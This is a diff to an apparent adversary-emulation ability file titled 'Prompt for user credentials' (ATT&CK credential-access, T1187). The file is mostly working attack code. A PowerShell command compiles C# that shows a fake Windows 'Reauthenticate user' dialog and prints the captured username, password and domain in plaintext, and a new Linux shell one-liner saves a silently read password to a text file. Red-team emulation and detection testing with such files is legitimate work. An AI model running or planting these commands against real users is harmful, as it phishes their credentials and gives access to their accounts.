@@ -1,12 +1,8 @@
 id: 5c90420e-7972-4125-833b-16c89d5c303f
-metadata:
-  authors:
-    - khyberspache
-  tags: []
-  version: 1
 name: Prompt for user credentials
-description: |
-  Displays a user authentication prompt to trick the user into providing their credentials to dump them in plaintext.
+description: >
+  Displays a user authentication prompt to trick the user into providing their
+  credentials to dump them in plaintext.
 tactic: credential-access
 technique:
   id: T1187
@@ -14,61 +10,13 @@ technique:
 platforms:
   windows:
     psh:
-      command: |
-        $type=@"
-        using System;
-        using System.Text;
-        using System.Runtime.InteropServices;
-
-        public static class CredUI
-        {
-
-        	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
-        	private struct CREDUI_INFO
-        	{
-        	     public int cbSize;
-        	     public IntPtr hwndParent;
-        	     public string pszMessageText;
-        	     public string pszCaptionText;
-        	     public IntPtr hbmBanner;
-        	}
-
-        	[DllImport("credui.dll", CharSet = CharSet.Auto)]
-        	private static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
-
-        	[DllImport("credui.dll", CharSet = CharSet.Auto)]
-        	private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere, int authError, ref uint authPackage, IntPtr InAuthBuffer, uint InAuthBufferSize, out IntPtr refOutAuthBuffer, out uint refOutAuthBufferSize, ref bool fSave, int flags);
-
-        	public static void Prompt() {
-        	    CREDUI_INFO credui = new CREDUI_INFO();
-        		credui.pszCaptionText = "Reauthenticate user";
-        		credui.pszMessageText = "This will allow us to grab your credentials in plaintext";
-        		credui.cbSize = Marshal.SizeOf(credui);
-        		uint authPackage = 0;
-        		IntPtr outCredBuffer = new IntPtr();
-        		uint outCredSize;
-        		bool save = false;
-        		int result = CredUIPromptForWindowsCredentials(ref credui, 0,ref authPackage,IntPtr.Zero, 0, out outCredBuffer, out outCredSize, ref save, 1 /* Generic */);
-
-        		var usernameBuf = new StringBuilder(100);
-        		var passwordBuf  = new StringBuilder(100);
-        		var domainBuf = new StringBuilder(100);
-
-        		int maxUserName = 100;
-        		int maxDomain = 100;
-        		int maxPassword = 100;
-        		if (result == 0)
-        		{
-        			if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName, domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
-        			{
-        				Console.WriteLine("Username: {0}", usernameBuf.ToString());
-        				Console.WriteLine("Password: {0}", passwordBuf.ToString());
-        				Console.WriteLine("Domain: {0}", domainBuf.ToString());
-        				return;
-        			}
-        		}
-        	}
-        }
-        "@
-        Add-Type -TypeDefinition $type;
-        [CredUI]::Prompt();
+      command: "$type=@\"\nusing System;\nusing System.Text;\nusing System.Runtime.InteropServices;\n\npublic static class CredUI\n{\n\n\t[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]\n\tprivate struct CREDUI_INFO\n\t{\n\t     public int cbSize;\n\t     public IntPtr hwndParent;\n\t     public string pszMessageText;\n\t     public string pszCaptionText;\n\t     public IntPtr hbmBanner;\n\t}\n\n\t[DllImport(\"credui.dll\", CharSet = CharSet.Auto)]\n\tprivate static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);\n\n\t[DllImport(\"credui.dll\", CharSet = CharSet.Auto)]\n\tprivate static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere, int authError, ref uint authPackage, IntPtr InAuthBuffer, uint InAuthBufferSize, out IntPtr refOutAuthBuffer, out uint refOutAuthBufferSize, ref bool fSave, int flags);\n\n\tpublic static void Prompt() {\n\t    CREDUI_INFO credui = new CREDUI_INFO();\n\t\tcredui.pszCaptionText = \"Reauthenticate user\";\n\t\tcredui.pszMessageText = \"This will allow us to grab your credentials in plaintext\";\n\t\tcredui.cbSize = Marshal.SizeOf(credui);\n\t\tuint authPackage = 0;\n\t\tIntPtr outCredBuffer = new IntPtr();\n\t\tuint outCredSize;\n\t\tbool save = false;\n\t\tint result = CredUIPromptForWindowsCredentials(ref credui, 0,ref authPackage,IntPtr.Zero, 0, out outCredBuffer, out outCredSize, ref save, 1 /* Generic */);\n\n\t\tvar usernameBuf = new StringBuilder(100);\n\t\tvar passwordBuf  = new StringBuilder(100);\n\t\tvar domainBuf = new StringBuilder(100);\n\n\t\tint maxUserName = 100;\n\t\tint maxDomain = 100;\n\t\tint maxPassword = 100;\n\t\tif (result == 0)\n\t\t{\n\t\t\tif (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName, domainBuf, ref maxDomain, passwordBuf, ref maxPassword))\n\t\t\t{\n\t\t\t\tConsole.WriteLine(\"Username: {0}\", usernameBuf.ToString());\n\t\t\t\tConsole.WriteLine(\"Password: {0}\", passwordBuf.ToString());\n\t\t\t\tConsole.WriteLine(\"Domain: {0}\", domainBuf.ToString());\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\n}\n\"@\nAdd-Type -TypeDefinition $type;\n[CredUI]::Prompt();\n"
+  linux:
+    sh:
+      command: 'read -sp "Enter Password: " T1187 && echo $T1187 > T1187.txt'
+metadata:
+  authors:
+    - khyberspache
+    - bfuzzy1
+  tags: []
+  version: 2
